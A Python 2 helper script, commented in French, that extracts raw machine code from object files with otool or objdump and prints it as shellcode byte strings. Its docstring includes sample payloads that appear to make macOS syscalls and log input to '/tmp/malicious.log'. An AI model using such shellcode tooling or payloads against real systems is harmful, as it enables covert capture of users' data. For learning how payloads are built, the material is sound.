#!/usr/bin/python

r"""
Un programme pour afficher un payload a partir d'un ou de plusieurs fichiers objet.

Exemple d'utilisation:
$ ./print_payload.py read.o
Payload for read.o:
"\x52\xb8\x03\x00\x00\x02\x0f\x05\x5a\x50\x57\x52\x56\xb8\x05\x00"
"\x00\x02\xeb\x23\x5f\xbe\x0a\x02\x00\x00\xba\xff\x01\x00\x00\x0f"
"\x05\x48\x89\xc7\xb8\x04\x00\x00\x02\x5e\x5a\x0f\x05\xb8\x06\x00"
"\x00\x02\x0f\x05\x5f\x58\xc3\xe8\xd8\xff\xff\xff\x2f\x74\x6d\x70"
"\x2f\x6d\x61\x6c\x69\x63\x69\x6f\x75\x73\x2e\x6c\x6f\x67\x00"

$ ./print_payload.py read.o read2.o
Payload for read.o:
"\x52\xb8\x03\x00\x00\x02\x0f\x05\x5a\x50\x57\x52\x56\xb8\x05\x00"
"\x00\x02\xeb\x23\x5f\xbe\x0a\x02\x00\x00\xba\xff\x01\x00\x00\x0f"
"\x05\x48\x89\xc7\xb8\x04\x00\x00\x02\x5e\x5a\x0f\x05\xb8\x06\x00"
"\x00\x02\x0f\x05\x5f\x58\xc3\xe8\xd8\xff\xff\xff\x2f\x74\x6d\x70"
"\x2f\x6d\x61\x6c\x69\x63\x69\x6f\x75\x73\x2e\x6c\x6f\x67\x00"

Payload for read2.o:
"\xb8\x03\x00\x00\x02\x0f\x05\x50\x56\xb8\x05\x00\x00\x02\xeb\x25"
"\x5f\xbe\x0a\x02\x00\x00\xba\xff\x01\x00\x00\x0f\x05\x48\x89\xc7"
"\xb8\x04\x00\x00\x02\x5e\x48\x8b\x14\x24\x0f\x05\xb8\x06\x00\x00"
"\x02\x0f\x05\x58\xc3\xe8\xd6\xff\xff\xff\x2f\x74\x6d\x70\x2f\x6d"
"\x61\x6c\x69\x63\x69\x6f\x75\x73\x2e\x6c\x6f\x67\x00"
"""

import sys
import subprocess
import re

def print_payload_osx(path):
	try:
		output = subprocess.check_output(["otool", "-t", path])
	except OSError:
		print "Can't find otool :("
		sys.exit(1)
	code = output.splitlines()[2:]
	for line in code:
		print '"\\x' + '\\x'.join(line.split()[1:]) + '"'

def print_payload_linux(path):
	try:
		output = subprocess.check_output(["objdump", "-d", path])
	except OSError:
		print "Can't find objdump :("
		sys.exit(1)
	lines = output.splitlines()
	regexp = re.compile(r'[\t ]([0-9a-f]{2})')

	# get payload
	payload = []
	for line in lines:
		match = regexp.findall(line)
		if match == []:
			continue
		payload += match

	# affiche le payload par bout de 16 bytes
	for i in xrange(0, len(payload), 16):
		print '"\\x' + '\\x'.join(payload[i:i+16]) + '"'

def print_payload(path):
	"Affiche un payload a partir d'un fichier .o"
	# osx
	if sys.platform == 'darwin':
		print_payload_osx(path)
	elif sys.platform == 'linux2':
		print_payload_linux(path)

if __name__ == "__main__":
	if len(sys.argv) < 2:
		print "%s: [file.o ...]" % sys.argv[0]
	for index, object_file in enumerate(sys.argv[1:]):
		if not object_file.endswith(".o"):
			print "%s: [file.o ...]" % sys.argv[0]
			continue
		print "Payload for %s:" % object_file
		print_payload(object_file)
		if index != len(sys.argv[1:]) - 1:
			print ""